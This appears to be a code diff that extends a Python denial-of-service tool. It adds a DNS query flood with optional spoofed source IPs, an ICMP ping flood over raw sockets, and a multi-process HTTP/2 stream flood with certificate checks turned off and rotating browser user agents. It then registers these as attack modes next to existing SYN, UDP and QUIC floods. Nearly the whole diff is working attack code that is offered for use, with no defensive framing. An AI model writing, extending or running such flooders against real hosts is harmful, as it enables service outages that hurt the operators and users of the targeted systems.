@@ -801,6 +801,246 @@ async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
     if writer.transport:
         writer.transport.abort()
 
+# ── DNS flood: UDP DNS query flood ──────────────────────────────
+def _mp_dns_flood(args_tuple):
+    """Multi-process DNS query flooder: spoofed source IP, random domain."""
+    import time as _time
+    import random as _rnd
+    import struct as _struct
+    host, port, duration, src_ip = args_tuple
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+    if src_ip:
+        try:
+            sock.bind((src_ip, 0))
+        except OSError:
+            pass
+    
+    # Random domain names
+    domains = ['example.com', 'google.com', 'cloudflare.com', 'test.org', 'domain.net',
+               'a.b.c.d', 'sub.domain.com', 'api.service.io', 'cdn.assets.com', 'mail.server.net']
+    sent = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        n = 5000
+        try:
+            for _ in range(n):
+                # DNS query: header (12 bytes) + question
+                # Header: ID, flags(0x0100=RD), QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
+                query_id = _rnd.randint(0, 65535)
+                domain = _rnd.choice(domains)
+                # Encode domain name
+                qname = b''
+                for label in domain.split('.'):
+                    qname += bytes([len(label)]) + label.encode()
+                qname += b'\x00'
+                # Question: qname + QTYPE(1=A) + QCLASS(1=IN)
+                question = qname + _struct.pack('!HH', 1, 1)
+                dns_packet = _struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0) + question
+                sock.sendto(dns_packet, (host, port))
+            sent += n
+        except Exception:
+            break
+    sock.close()
+    return sent
+
+async def dns_worker(name, url, stats, duration, stop, payload_size=0):
+    """DNS flood worker: UDP DNS queries with spoofed IPs."""
+    host, port = parse_udp(url)
+    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = []
+    for i in range(n_procs):
+        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
+        targets.append((host, port, duration, src_ip))
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_dns_flood, targets)
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [0] * n_procs
+    total = sum(results) if isinstance(results, list) else results
+    stats.packets += total
+    stats.bytes += total * 60  # avg DNS query size
+
+# ── ICMP flood: ping flood ──────────────────────────────────────
+def _mp_icmp_flood(args_tuple):
+    """Multi-process ICMP ping flooder."""
+    import time as _time
+    import struct as _struct
+    import os
+    host, port, duration = args_tuple
+    # ICMP raw socket (needs root/admin on most systems)
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+    except PermissionError:
+        # Fallback: use UDP to simulate (less effective)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # ICMP echo request: type=8, code=0, checksum, id, seq, payload
+    pid = os.getpid() & 0xFFFF
+    payload = b'dossal-icmp-ping-payload-' * 8  # 256 bytes
+    sent = 0
+    end = _time.time() + duration
+    seq = 0
+    while _time.time() < end:
+        n = 5000
+        try:
+            for _ in range(n):
+                seq = (seq + 1) & 0xFFFF
+                # ICMP header: type(8), code(0), checksum(0), id, seq
+                icmp_hdr = _struct.pack('!BBHHH', 8, 0, 0, pid, seq)
+                packet = icmp_hdr + payload
+                # Calculate ICMP checksum
+                if len(packet) % 2:
+                    packet += b'\x00'
+                s = 0
+                for i in range(0, len(packet), 2):
+                    w = (packet[i] << 8) + packet[i+1]
+                    s += w
+                s = (s >> 16) + (s & 0xFFFF)
+                s += s >> 16
+                checksum = ~s & 0xFFFF
+                packet = _struct.pack('!BBHHH', 8, 0, checksum, pid, seq) + payload
+                try:
+                    if sock.type == socket.SOCK_RAW:
+                        sock.sendto(packet, (host, 0))
+                    else:
+                        sock.sendto(packet, (host, 7))  # port 7 for UDP fallback
+                except Exception:
+                    pass
+                sent += 1
+        except Exception:
+            break
+    sock.close()
+    return sent
+
+async def icmp_worker(name, url, stats, duration, stop, payload_size=0):
+    """ICMP ping flood worker."""
+    host, port = parse_udp(url)
+    n_procs = max(1, min(8, _UDP_NPROCS[0]))
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_icmp_flood, targets)
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [0] * n_procs
+    total = sum(results) if isinstance(results, list) else results
+    stats.packets += total
+    stats.bytes += total * 276  # avg ICMP packet size
+
+# ── H2 multiprocess: raw socket + h2 frames ─────────────────────
+def _mp_h2_flood(args_tuple):
+    """Multi-process H2 flooder: TLS + h2 in a child process.
+    Each process opens one H2 connection with many concurrent streams."""
+    import time as _time
+    import ssl as _ssl
+    import socket as _socket
+    import random as _rnd
+    from h2.connection import H2Connection
+    from h2.config import H2Configuration
+    from h2.events import DataReceived
+    host, port, path, duration, streams = args_tuple
+    sent = 0
+    errors = 0
+    h2_429 = 0
+    try:
+        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+        ctx.set_alpn_protocols(['h2'])
+        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+        raw.settimeout(5.0)
+        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
+        raw.connect((host, port))
+        ssock = ctx.wrap_socket(raw, server_hostname=host)
+        
+        # h2 connection
+        config = H2Configuration(client_side=True)
+        conn = H2Connection(config=config)
+        conn.initiate_connection()
+        ssock.sendall(conn.data_to_send())
+        # Wait for server SETTINGS
+        try:
+            data = ssock.recv(8192)
+            conn.receive_data(data)
+        except Exception:
+            pass
+        
+        # Randomized headers
+        uas = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/121.0',
+        ]
+        paths = [path, '/', '/index.html', '/api', '/static/app.js']
+        
+        end = _time.time() + duration
+        while _time.time() < end:
+            try:
+                # Send a batch of concurrent streams
+                for _ in range(min(streams, 100)):
+                    stream_id = conn.get_next_available_stream_id()
+                    headers = [
+                        (':method', 'GET'),
+                        (':scheme', 'https'),
+                        (':authority', host),
+                        (':path', _rnd.choice(paths)),
+                        ('user-agent', _rnd.choice(uas)),
+                        ('accept', 'text/html,*/*'),
+                        ('sec-fetch-dest', 'document'),
+                        ('sec-fetch-mode', 'navigate'),
+                    ]
+                    conn.send_headers(stream_id, headers, end_stream=True)
+                data = conn.data_to_send()
+                if data:
+                    ssock.sendall(data)
+                sent += min(streams, 100)
+                # Drain responses
+                deadline = _time.time() + 0.5
+                while _time.time() < deadline:
+                    try:
+                        ssock.settimeout(0.05)
+                        chunk = ssock.recv(65535)
+                        if not chunk:
+                            break
+                        events = conn.receive_data(chunk)
+                        for event in events:
+                            if isinstance(event, DataReceived):
+                                pass  # just drain
+                    except _socket.timeout:
+                        break
+                    except Exception:
+                        break
+            except Exception:
+                break
+        ssock.close()
+    except Exception:
+        errors += 1
+    return sent, errors, h2_429
+
+async def h2mp_worker(name, url, stats, duration, stop, payload_size=1024):
+    """H2 multiprocess worker: N processes, each with their own H2 conn."""
+    host, port, path = parse_http(url)
+    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    # Each process: 100 concurrent streams
+    streams = 100
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, path, duration, streams)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_h2_flood, targets)
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [(0, 0, 0)] * n_procs
+    for sent, errs, h429 in results:
+        stats.requests += sent
+        stats.errors += errs
+    stats.conns += n_procs
+
 # ── gRPC worker: HTTP/2 + gRPC framing ──────────────────────────
 def _mp_grpc_flood(args_tuple):
     """Multi-process gRPC flooder: TLS + h2 + gRPC frames in a child process."""
@@ -1645,7 +1885,10 @@ WORKERS = {
     "tcp":       tcp_worker,
     "udp":       udp_worker,
     "udy":       udp_worker,
-    "h2":        h2_worker,
+    "h2":          h2_worker,
+    "h2mp":        h2mp_worker,
+    "dns":         dns_worker,
+    "icmp":        icmp_worker,
     "grpc":      grpc_worker,
     "grpcmp":    grpc_mp_worker,
     "quic":      quic_worker,
@@ -1830,7 +2073,7 @@ async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_
         per_mode = max(1, _UDP_NPROCS[0] // n_l4)
         _UDP_NPROCS[0] = per_mode
     
-    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm'}
+    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'dns', 'icmp'}
     for mode in modes:
         worker_fn = WORKERS[mode]
         pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
